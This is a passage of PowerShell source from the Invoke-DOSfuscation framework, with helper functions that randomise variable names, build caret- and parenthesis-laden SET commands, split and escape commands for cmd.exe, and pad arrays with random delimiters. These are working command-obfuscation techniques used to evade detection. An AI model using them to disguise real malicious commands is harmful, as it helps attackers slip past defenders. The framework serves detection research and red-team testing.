License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Get-RandomVarName generates a random variable name string that is unique for every Invoke-Dos*Command function invocation in the Invoke-DOSfuscation framework to prevent variable name collisions.

.PARAMETER VarNameSpecialChar

(Optional) Specifies the variable name to be comprised entirely of special characters.

.PARAMETER VarNameWhitespace

(Optional) Specifies the variable name to be comprised entirely of whitespace characters following a mandatory initial non-VarNameWhitespace character (randomly-selected special character).

.PARAMETER UniqueFirstChar

(Optional) Specifies the variable name to be comprised of a single character that is unique from the first character of all existing variables names (primarily important when using FOR loop variables).

.PARAMETER RandomVarNameLengthRange

(Optional) Specifies the range of the length of each randomly-selected variable name. Default value is @(2..4).

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $VarNameSpecialChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $VarNameWhitespace,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $UniqueFirstChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -gt 0 } )]
        [System.Object[]]
        $RandomVarNameLengthRange = @(2..4)
    )

    # Blacklist all current (and presumably standard) environment variables to avoid collisions with existing environment variables.
    # Also blacklist built-in environment variables that do not appear when running SET.
    $blacklistedVarNames = @()
    $blacklistedVarNames += (Get-ChildItem env:).Name
    $blacklistedVarNames += @('CD','DATE','TIME','TMP','TEMP','PATH','OS')

    # Generate random variable name unique for every Invoke-Dos*Command function invocation in the Invoke-DOSfuscation framework to prevent variable name collisions.
    $increasingWhitespace = ''
    do
    {
        # For each obfuscation function execution (the function calling this helper function) maintain list of 10 alpha-numerics reserved for FOR loop variables.
        # This is because a FOR loop variable %a will collide with a process-level environment variable starting with the same letter or number like %abc%.
        if (-not $script:reservedUniqueFirstChars)
        {
            $script:reservedUniqueFirstChars = Get-Random -InputObject @([System.Char[]] @(65..90) + [System.Char[]] @(97..122) + @(0..9)) -Count 10
        }

        $VarNameSpecialCharsForVarName = @('`','~','@','#','$','*','-','_','+','[',']','{','}','\',"'",';',',','.','?')
        if ($VarNameWhitespace.IsPresent)
        {
            # Whitespace variable names are possible as long as the variable starts with a non-VarNameWhitespace character.
            $increasingWhitespace += ' ' * (Get-Random -InputObject $RandomVarNameLengthRange)
            $setVarName = (Get-Random -InputObject $VarNameSpecialCharsForVarName -Count 1) + $increasingWhitespace
        }
        elseif ($VarNameSpecialChar.IsPresent)
        {
            $setVarName = -join (Get-Random -InputObject $VarNameSpecialCharsForVarName -Count (Get-Random -InputObject $RandomVarNameLengthRange))
        }
        elseif ($UniqueFirstChar.IsPresent)
        {
            # Throw warning if $script:reservedUniqueFirstChars is depleted as the command will likely not run correctly.
            if (-not $script:reservedUniqueFirstChars)
            {
                Write-Warning "Reserved unique first characters array (`$script:reservedUniqueFirstChars) has been depleted, so this command will likely not run correctly. Try re-running this obfuscation function."

                return $null
            }

            # Select random alpha-numeric character from $script:reservedUniqueFirstChars that has not been selected before.
            if ($script:varNameArray.Count -gt 0)
            {
                $setVarName = Get-Random -InputObject ($script:reservedUniqueFirstChars | where-object { ($script:varNameArray | foreach-object { $_.ToString().Substring(0,1) } ) -notcontains $_ } )
            }
            else
            {
                $setVarName = Get-Random -InputObject ($script:reservedUniqueFirstChars | where-object { $script:varNameArray -notcontains $_ } )
            }
        }
        else
        {            
            # Select random alpha-numeric character/string that does not begin with a reserved character from $script:reservedUniqueFirstChars.
            do
            {
                $setVarName = -join (Get-Random -InputObject (@([System.Char[]] @(65..90) + [System.Char[]] @(97..122) + @(0..9))) -Count (Get-Random -InputObject $RandomVarNameLengthRange))
            }
            while ($script:reservedUniqueFirstChars -contains $setVarName.ToString().Substring(0,1))
        }
    }
    while ( ($script:varNameArray -contains $setVarName) -or ($blacklistedVarNames -contains $setVarName) )

    # Add unique random variable name to $script:varNameArray then return value.
    $script:varNameArray += $setVarName

    return $setVarName
}


function Out-SetVarCommand
{
<#
.SYNOPSIS

Out-SetVarCommand generates the concatenated syntax for setting all input substrings as process-level environment variables for cmd.exe. This function supports obfuscation options like randomized case, randomized whitespace and/or randomized parentheses/commas/semicolons wherever possible.

Invoke-DOSfuscation Helper Function: Out-SetVarCommand
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies:  Get-RandomVarName, Out-RandomCase, Out-ObfuscatedArray, Out-ObfuscatedCaret
Optional Dependencies: None
 
.DESCRIPTION

Out-SetVarCommand generates the concatenated syntax for setting all input substrings as process-level environment variables for cmd.exe. This function supports obfuscation options like randomized case, randomized whitespace and/or randomized parentheses/commas/semicolons wherever possible.

.PARAMETER SubstringArray

Specifies the array of substrings for which concatenated SET syntax will be generated.

.PARAMETER RandomCase

(Optional) Specifies that random casing be used for all SET commands and variable names.

.PARAMETER RandomSpace

(Optional) Specifies that random whitespace be input in all SET commands wherever possible.

.PARAMETER RandomSpaceRange

(Optional) Specifies the range of the length of each randomly-selected whitespace if -RandomSpace is also selected.

.PARAMETER RandomCaret

(Optional) Specifies that random carets be added before non-escapable characters in syntax components not affected by caret escape characters.

.PARAMETER RandomCaretPercent

(Optional) Specifies the percentage of characters to obfuscate with caret escape characters if -RandomCaret is also selected.

.PARAMETER RandomChar

(Optional) Specifies that random commas, semicolons and parentheses encapsulate all SET commands.

.PARAMETER RandomCharRange

(Optional) Specifies the range of the count of commas, semicolons and parentheses to encapsulate all SET commands if -RandomChar is also selected.

.PARAMETER RandomCharPercent

(Optional) Specifies the percentage of parentheses to insert random commas and semicolons between if -RandomChar is also selected.

.PARAMETER RandomCharArray

(Optional) Specifies the array of characters to insert between parentheses (typically only commas and/or semicolons).

.PARAMETER VarNameSpecialChar

(Optional) Specifies the variable names to be comprised entirely of special characters.

.PARAMETER VarNameWhitespace

(Optional) Specifies the variable names to be comprised entirely of whitespace characters following a mandatory initial non-VarNameWhitespace character (randomly-selected special character).

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    [OutputType('System.Object[]')]
    param (
        [Parameter(Position = 0, Mandatory = $true)]
        [System.String[]]
        $SubstringArray,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCase,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomSpace,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomSpaceRange = @(0..4),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCaret,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCaretPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomCharRange = @(1..5),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCharPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | where-object { @(',',' ',';') -contains $_ }) -or ($_ | where-object { (($_.Count -eq 2) -or ($_.Count -eq 3)) -and (@(',',' ',';') -contains $_[0]) -and (@(',',';') -contains $_[1]) }) } )]
        [System.Object[]]
        $RandomCharArray = (Get-Random -InputObject @(@(','),@(' '))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $VarNameSpecialChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $VarNameWhitespace
    )

    # Create array to store all SET commands for each substring.
    $setCommandArray = @()

    # Create local array to store all random variable names generated for input $SubstringArray.
    $setVarNameArrayForCurrentSubstringArray = @()

    # Generate random variable names and add SET command syntax for input $Command to $setCommandArray.
    foreach ($substring in $SubstringArray)
    {
        # Generate unique, random variable name.
        $setVarName = Get-RandomVarName -VarNameSpecialChar:$VarNameSpecialChar -VarNameWhitespace:$VarNameWhitespace

        # Add unique $setVarName to array so it will not be randomly selected again.
        $script:varNameArray += $setVarName

        # Set random case values if -RandomCase switch is set.
        $set    = 'set'
        $andAnd = '&&'
        if ($RandomCase.IsPresent)
        {
            $set    = Out-RandomCase 'set'
            $andAnd = Get-Random -InputObject @('&','&&')
        }

        # Add random carets if -RandomCaret switch is set.
        if ($RandomCaret.IsPresent)
        {
            $set        = Out-ObfuscatedCaret -StringToObfuscate $set        -RandomCaretPercent:$RandomCaretPercent
            $substring  = Out-ObfuscatedCaret -StringToObfuscate $substring  -RandomCaretPercent:$RandomCaretPercent
            $setVarName = Out-ObfuscatedCaret -StringToObfuscate $setVarName -RandomCaretPercent:$RandomCaretPercent
        }
        
        # Add unique $setVarName to local array so it can be passed back to calling function.
        $setVarNameArrayForCurrentSubstringArray += $setVarName

        # Set random whitespace values if -RandomSpace switch is set.
        $RandomSpace1 = ''
        $RandomSpace2 = ''
        if ($RandomSpace.IsPresent)
        {
            $RandomSpace1 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
            $RandomSpace2 = ' ' * (Get-Random -InputObject $RandomSpaceRange)

            # Add random carets if -RandomCaret switch is set.
            if ($RandomCaret.IsPresent)
            {
                $RandomSpace1 = Out-ObfuscatedCaret -StringToObfuscate $RandomSpace1 -RandomCaretPercent:$RandomCaretPercent
            }
        }

        # If -RandomChar argument is selected then add random parenthese layers where applicable based on $RandomCharRange.
        if ($RandomChar.IsPresent)
        {
            # Escape parentheses in $substring so they do not cause errors for cmd.exe.
            $substring = $substring.Replace('(','^(').Replace(')','^)')

            # Retrieve parenthesis counts from $randomCharRange so we get a balanced number of left and right parentheses from Get-RandomWhitespaceAndRandomChar.
            $parenCount = Get-Random -InputObject $randomCharRange -Count 1

            # Get random left and right parentheses with random whitespace if -RandomWhitespace argument is selected and with random commas and/or semicolons delimiters if -RandomChar argument is selected.
            $leftParen  = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount) | foreach-object { '(' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
            $rightParen = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount) | foreach-object { ')' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
    
            # Trim leading delimiters and whitespace from parentheses since they will cause errors for variable SET commands inside FOR loops and PowerShell payloads.
            $leftParen  = $leftParen.Trim(' ,;')
            $rightParen = $rightParen.Trim(' ,;')
        }
        else
        {
            $leftParen  = ''
            $rightParen = ''
        }
        
        # Add SET syntax to array.
        $setCommandArray += "$leftParen$set $randomSpace1$setVarName=$substring$rightParen$andAnd$randomSpace2"
    }

    # Return resultant array of substrings and random variable names with SET command syntax.
    return @($setCommandArray , $setVarNameArrayForCurrentSubstringArray)
}


function Split-Command
{
<#
.SYNOPSIS

Split-Command concatenates input command according to defined concatenation percentage and handles various levels of escaping.

Invoke-DOSfuscation Helper Function: Split-Command
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Split-Command concatenates input command according to defined concatenation percentage and handles various levels of escaping.

.PARAMETER CommandToSplit

Specifies command to split into substrings.

.PARAMETER ConcatenationPercent

Specifies the percentage of input CommandToSplit to concatenate by adjusting the number of substrings.

.PARAMETER DoubleEscape

(Optional) Specifies that the calling function's -StdIn switch is selected and therefore an additional layer of escaping is required for all special characters.

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [System.String]
        $CommandToSplit,
        
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $ConcatenationPercent,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $DoubleEscape
    )

    # Since we will "escape" double quotes by doubling up on quoting then we will reduce paired double quotes and single double quotes to the two belom delimiters for this substring phase.
    # This will avoid errors if a pair of double quotes would otherwise be split up across multiple substrings in the below process.
    # If $CommandToSplit contains both paired double quotes AND single double quotes then we will split all substrings on the paired double quotes since cmd.exe behaves irregularly in some fringe cases when """" is present.
    $doubleQuotePairedDelim = $null
    $doubleQuoteDelim = $null

    # Select delimiter characters from range of characters highly unlikely to all be used in a single command.
    # These delimiters will be replaced back at the end of this function and will not appear in the final command.
    foreach ($char in ([System.Char[]] @(161..500)))
    {
        if (-not $doubleQuotePairedDelim)
        {
            if (-not $CommandToSplit.Contains($char))
            {
                $doubleQuotePairedDelim = [System.String] $char
            }
        }
        else
        {
            if (-not $CommandToSplit.Contains($char))
            {
                $doubleQuoteDelim = [System.String] $char
                break
            }
        }
    }

    # Replace single and paired double quotes with their corresponding delimiters selected in the above foreach loop.
    $CommandToSplit = $CommandToSplit.Replace('""',$doubleQuotePairedDelim).Replace('"',$doubleQuoteDelim)
    
    # Randomly select index count to match the percentage passed in via $ConcatenationPercent.
    $indexCount = [System.Int16] ($CommandToSplit.Length * ([System.Double] $ConcatenationPercent / 100))

    # Make sure index count is at least 1.
    if ($indexCount -eq 0)
    {
        $indexCount = 1
    }

    # Randomly select indexes on which to concatenate the command.
    $concatIndexes = @(Get-Random -InputObject @(1..($CommandToSplit.Length - 1)) -Count $indexCount | sort-object)
    
    # Store concatenated command substrings in $substringArray.
    $substringArray  = @()
    $substringArray += $CommandToSplit.Substring(0,$concatIndexes[0])

    for ($i = 0; $i -lt ($concatIndexes.Length - 1); $i++)
    {
        $index = $concatIndexes[$i]
        $lengthToNextIndex = $concatIndexes[$i + 1] - $index
        $substring = $CommandToSplit.Substring($index,$lengthToNextIndex)

        $substringArray += $substring
    }

    # Add last remaining substring to $substringArray.
    $substringArray += $CommandToSplit.Substring($concatIndexes[$i])

    # If paired double quotes are present then perform any necessary additional splitting to avoid errors for adjacent pairs of paired double quotes.
    if ($CommandToSplit.Contains($doubleQuoteDelim))
    {
        $substringArrayTemp = @()
        foreach ($substring in $substringArray)
        {
            if ($substring.Contains($doubleQuotePairedDelim))
            {
                # Split $substring on the paired double quote delim and then reinsert double quotes into substrings appropriately.
                $substringSplit = $substring.Split($doubleQuotePairedDelim)

                # Handle if more than one set of paired double quotes existed in $substring.
                if ($substringSplit.Count -gt 2)
                {
                    # Handle first substring.
                    $substringArrayTemp += $substringSplit[0] + $doubleQuoteDelim

                    # Handle all substrings up until the last substring.
                    foreach ($curSubstring in $substringSplit[1..($substringSplit.Count - 2)])
                    {
                        $substringArrayTemp += $doubleQuoteDelim + $curSubstring + $doubleQuoteDelim
                    }

                    # Handle last substring.
                    $substringArrayTemp += $doubleQuoteDelim + $substringSplit[-1]
                }
                else
                {
                    # Add two-part split substring to temporary resultant array.
                    $substringArrayTemp += $substringSplit[0] + $doubleQuoteDelim
                    $substringArrayTemp += $doubleQuoteDelim + $substringSplit[1]
                }
            }
            else
            {
                $substringArrayTemp += $substring
            }
        }
        $substringArray = $substringArrayTemp
    }

    # Define characters that need to be escaped properly from a cmd.exe perspective.
    # Do not move '^' from the first element of below $charsToEscape array, otherwise the escape character will be incorrectly escaped.
    $charsToEscape = @('^','&','<','>','|')

    # Perform any necessary delimiter substitutions and/or special character escaping for substrings in $substringArray.
    $substringArrayTemp = @()
    foreach ($substring in $substringArray)
    {
        # Substitute both double quote placeholder delimiters with "escaped" double quotes (via doubling the double quotes).
        $substring = $substring.Replace($doubleQuoteDelim,'""').Replace($doubleQuotePairedDelim,'""')
        
        # Perform special character escaping if necessary.
        foreach ($charToEscape in $charsToEscape)
        {
            # Double escape if -DoubleEscape switch is selected (which occurs when -StdIn switch is selected in calling function).
            if ($DoubleEscape.IsPresent)
            {
                $substring = $substring.Replace($charToEscape , ('^^^^' + '^^^' + $charToEscape))
            }
            else
            {
                $substring = $substring.Replace($charToEscape , ('^^^' + $charToEscape))
            }
        }
        $substringArrayTemp += $substring
    }
    $substringArray = $substringArrayTemp | where-object { $_ }

    # Return resultant array of substrings.
    return $substringArray
}


function Test-ContainsEscapableCharacter
{
<#
.SYNOPSIS

Test-ContainsEscapableCharacter returns a boolean value of $true if the input command contains any characters that must be escaped in the context of cmd.exe.

Invoke-DOSfuscation Helper Function: Test-ContainsEscapableCharacter
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Test-ContainsEscapableCharacter returns a boolean value of $true if the input command contains any characters that must be escaped in the context of cmd.exe.

.PARAMETER Command

Specifies command to check for the existence of any characters that must be escaped in the context of cmd.exe.

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [System.String]
        $Command
    )

    $charsToEscape = @('^','&','|','<','>')
    $containsCharToEscape = $false
    foreach ($charToEscape in $charsToEscape)
    {
        if ($Command.Contains($charToEscape))
        {
            $containsCharToEscape = $true
            break
        }
    }

    return $containsCharToEscape
}


function Test-ContainsUnevenDoubleQuote
{
<#
.SYNOPSIS

Test-ContainsUnevenDoubleQuote returns a boolean value of $true if the input command contains an uneven number of double quote characters as this will cause problems for cmd.exe since quotes cannot be truly escaped.

Invoke-DOSfuscation Helper Function: Test-ContainsUnevenDoubleQuote
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Test-ContainsUnevenDoubleQuote returns a boolean value of $true if the input command contains an uneven number of double quote characters as this will cause problems for cmd.exe since quotes cannot be truly escaped.

.PARAMETER Command

Specifies command to check for the existence of an uneven number of double quote characters.

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $true)]
        [System.String]
        $Command
    )

    # Throw warning if the user-input $Command contains uneven/unbalanced double quotes as this will cause errors.
    if (($Command.Length - $Command.Replace('"','').Length) % 2)
    {
        Write-Warning "Uneven/Unbalanced double quote(s) detected in input `$Command. This will cause errors in final result. Please ensure an even number of double quotes are present in `$Command and try again."

        return $true
    }
    else
    {
        return $false
    }
}


function Remove-Tab
{
<#
.SYNOPSIS

Remove-Tab returns the input Command with tabs converted to whitespace and throws certain warning messages regarding tab usage in cmd.exe.

Invoke-DOSfuscation Helper Function: Remove-Tab
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Remove-Tab returns the input Command with tabs converted to whitespace and throws certain warning messages regarding tab usage in cmd.exe.

.PARAMETER Command

Specifies command to check for the existence of invalid tab usage.

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding(SupportsShouldProcess = $true)]
    param (
        [Parameter(Position = 0, Mandatory = $true)]
        [System.String]
        $Command
    )

    # Throw warning for tabs since copy/pasting into cmd.exe will replace tabs with whitespace. If Invoke-Obfuscation's Whitespace/Tab encoding option (ENCODING\8) is input as $Command then this function will exit. Otherwise it will replace tabs with four whitespaces and continue after throwing a warning.
    if ($Command.Contains("`t"))
    {
        if ($PSCmdlet.ShouldProcess("Removal of tab(s) from input `$Command variable successful"))
        {
            # Display separate error message and exit if Invoke-Obfuscation's Whitespace/Tab encoding option (ENCODING\8) is input as $Command.
            if ($Command -match '(\t\s{2,3}\t\s{1,10}\t|\s\t{2,3}\s\t{1,10}\s)')
            {
                Write-Warning "Input command appears to be Invoke-Obfuscation's Whitespace/Tab encoding option (ENCODING\8). When pasting tabs into cmd.exe they are converted to a single whitespace so this encoding will not work in this function. Please try another obfuscation option that does not rely on tab characters."
            
                $Command = $null
            }
            else
            {
                Write-Warning "Input contains one or more tab characters. When pasting tabs into cmd.exe they are converted to a single whitespace so this function is replacing each tab character with four whitespace characters. If possible please try another input command that does not rely on tab characters."

                $Command = $Command.Replace("`t",'    ')
            }
        }
    }

    return $Command
}


function Out-EscapedPowerShell
{
<#
.SYNOPSIS

Out-EscapedPowerShell performs an additional layer of escaping for PowerShell commands being launched by cmd.exe, specifically via tokenization of the user-input command and inspection of various scenarios involving string tokens.

Invoke-DOSfuscation Helper Function: Out-EscapedPowerShell
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Out-EscapedPowerShell performs an additional layer of escaping for PowerShell commands being launched by cmd.exe, specifically via tokenization of the user-input command and inspection of various scenarios involving string tokens.

.PARAMETER CommandToEscape

Specifies command to escape from a PowerShell tokenization perspective -- namely numerous scenarios involving escapable characters in string tokens.

.PARAMETER StdIn

(Optional) Specifies that the obfuscated command will be echo'd to the final binary, so additional escaping considerations must be taken.

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $true)]
        [System.String]
        $CommandToEscape,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $StdIn
    )

    # Define characters that potentially need to be escaped.
    $charsToEscape = @('^','&','|','<','>','%')
    
    # Tokenize the input $CommandToEscape so string tokens can receive extra escaping under certain combinations of conditions).
    # Iterate through the extracted tokens in reverse to make the reassembly of modified extracted tokens simpler.
    $tokens = [System.Management.Automation.PSParser]::Tokenize($CommandToEscape,[ref] $null)
    for ($i = $tokens.Count-1; $i -ge 0; $i--)
    {
        $token = $tokens[$i]
        
        # Manually extract token from input $CommandToEscape since tokenization will remove certain characters and whitespace which we want to retain.
        $preTokenStr    = $CommandToEscape.SubString(0,$token.Start)
        $extractedToken = $CommandToEscape.SubString($token.Start,$token.Length)
        $postTokenStr   = $CommandToEscape.SubString($token.Start + $token.Length)
        
        # If certain string conditions are met then additional escaping must occur for the current $extractedToken.
        if ((($extractedToken -notmatch "^\'.*\'$") -and (($StdIn.IsPresent -and ($token.Type -ne 'String')) -or (-not $StdIn.IsPresent -and ($token.Type -eq 'String')))) -or
           (($token.Type -eq 'String') -and ($extractedToken -match "^\'.*\'$") -and $StdIn.IsPresent))
        {
            foreach ($char in $charsToEscape)
            {
                if ($extractedToken.Contains($char))
                {
                    $extractedToken = $extractedToken.Replace($char,"^$char")
                }
            }
        }
        
        # Add $extractedToken back into context in $CommandToEscape
        $CommandToEscape = $preTokenStr + $extractedToken + $postTokenStr
    }

    # Return resultant escaped command.
    return $CommandToEscape
}


function Test-ContainsEscapableCharacterInString
{
<#
.SYNOPSIS

Test-ContainsEscapableCharacterInString returns a boolean value of $true if the input command contains any string containing an escapable character.

Invoke-DOSfuscation Helper Function: Test-ContainsEscapableCharacterInString
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Test-ContainsEscapableCharacter
Optional Dependencies: None

.DESCRIPTION

Test-ContainsEscapableCharacterInString returns a boolean value of $true if the input command contains any string containing an escapable character.

.PARAMETER Command

Specifies command to check for the existence of any strings containing an escapable character.

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $true)]
        [System.String]
        $Command
    )

    # Tokenize the input $Command and iterate over all string tokens while checking for escapable characters.
    $stringTokens = [System.Management.Automation.PSParser]::Tokenize($Command,[ref] $null) | where-object { $_.Type -eq 'String' }

    foreach ($stringToken in $stringTokens)
    {
        # Return true if there are escapable characters in current string token.
        if ($stringToken.Content -and (Test-ContainsEscapableCharacter -Command $stringToken.Content))
        {
            return $true
        }
    }

    # Return false if no strings containing escapable characters were found.
    return $false
}


function Out-ObfuscatedArray
{
<#
.SYNOPSIS

Out-ObfuscatedArray returns the input array as a single string wth optional whitespace and comma/semicolon/+/- obfuscation if corresponding options are selected.

Invoke-DOSfuscation Helper Function: Out-ObfuscatedArray
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Out-ObfuscatedArray returns the input array as a single string wth optional whitespace and comma/semicolon/+/- obfuscation if corresponding options are selected.

.PARAMETER CommandIndexArray

Specifies array of values to join after adding optional whitespace and comma/semicolon obfuscation.

.PARAMETER RandomSpace

(Optional) Specifies that random whitespace be input between and encapsulating the array values.

.PARAMETER RandomSpaceRange

(Optional) Specifies the range of the length of each randomly-selected whitespace if -RandomSpace is also selected.

.PARAMETER RandomChar

(Optional) Specifies that random commas/semicolons be input between the array values.

.PARAMETER RandomCharRange

(Optional) Specifies the range of the count of commas and semicolons to be inserted between array values if -RandomChar is also selected.

.PARAMETER RandomCharPercent

(Optional) Specifies the percentage of array values to insert random commas and semicolons between if -RandomChar is also selected.

.PARAMETER RandomCharArray

(Optional) Specifies the array of characters to select from per iteration as random delimiters for input array values.

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object[]]
        $CommandIndexArray,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomSpace,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomSpaceRange = @(0..4),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomCharRange = @(1..5),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCharPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | where-object { @(',',' ',';') -contains $_ }) -or ($_ | where-object { (($_.Count -eq 2) -or ($_.Count -eq 3)) -and (@(',',' ',';') -contains $_[0]) -and (@(',',';') -contains $_[1]) }) } )]
        [System.Object[]]
        $RandomCharArray = (Get-Random -InputObject @(@(','),@(' ')))
    )

    # Randomly select delimiter character from $RandomCharArray.
    if ($randomCharArray.Count -eq 1)
    {
        $commandIndexDelim = $randomCharArray
    }
    else
    {
        $commandIndexDelim = Get-Random -InputObject $randomCharArray -Count 1
    }

    # If -RandomChar is selected then introduce random commas into $CommandIndexArray, the quantity of which is randomly selected from the range input via the -RandomCharRange argument at a frequency defined by the -RandomCharPercent argument.
    if ($RandomChar.IsPresent)
    {
        # Introduce additional delimiter characters as "index" values back into $CommandIndexArray.
        $CommandIndexArray = $CommandIndexArray | foreach-object {

            # Randomly add explicit '+' or '-' sign to positive index value option if -RandomChar is selected.
            $randomPlusOrMinusSign  = ''
            if ($RandomChar.IsPresent -and ((Get-Random -InputObject @(1..100)) -le $RandomCharPercent))
            {
                if ($_ -eq 0)
                {
                    $randomPlusOrMinusSign = Get-Random -InputObject @('-','+')
                }
                elseif ($_ -gt 0)
                {
                    $randomPlusOrMinusSign  = '+'
                }
            }

            # Start by returning the current index value.
            $randomPlusOrMinusSign + $_

            # Randomly select delimiter character from $RandomCharArray.
            if ($randomCharArray.Count -eq 1)
            {
                $commandIndexDelim = $randomCharArray
            }
            else
            {
                $commandIndexDelim = Get-Random -InputObject $randomCharArray -Count 1
            }
            
            # Introduce delimiter characters at the percentage input by the -RandomCharPercent argument.
            if ((Get-Random -InputObject @(0..100)) -le $randomCharPercent)
            {
                # Handle the character range differently depending on if $commandIndexDelim is already ',' vs ';' or whitespace.
                if ($commandIndexDelim -eq ',')
                {
                    $charRangeUpperLimit = [System.Int16] (((Get-Random -InputObject $randomCharRange) / 2) - 0.01)
                }
                else
                {
                    $charRangeUpperLimit = [System.Int16] ((Get-Random -InputObject $randomCharRange) - 0.01)
                }

                # Return the defined range of delimiter characters.
                @(1..$charRangeUpperLimit) | foreach-object { $commandIndexDelim }
            }
        }
        
        # Introduce delimiter characters at the percentage input by the -RandomCharPercent argument.
        if ((Get-Random -InputObject @(0..100)) -le $randomCharPercent)
        {
            # Handle the character range differently depending on if $commandIndexDelim is already ',' vs ';' or whitespace.
            if ($commandIndexDelim -eq ',')
            {
                $charRangeUpperLimit = [System.Int16] (((Get-Random -InputObject $randomCharRange) / 2) - 0.01)
            }
            else
            {
                $charRangeUpperLimit = [System.Int16] ((Get-Random -InputObject $randomCharRange) - 0.01)
            }
            
            # Introduce delimiter characters at beginning of $CommandIndexArray.
            $CommandIndexArray = (@(1..$charRangeUpperLimit) | foreach-object { $commandIndexDelim }) + $CommandIndexArray
        }
    }
    
    # Join the $CommandIndexArray values on the selected delimiter character.
    $commandIndexes = $CommandIndexArray -join $commandIndexDelim

    # Add random whitespace between index values if -RandomSpace switch is defined.
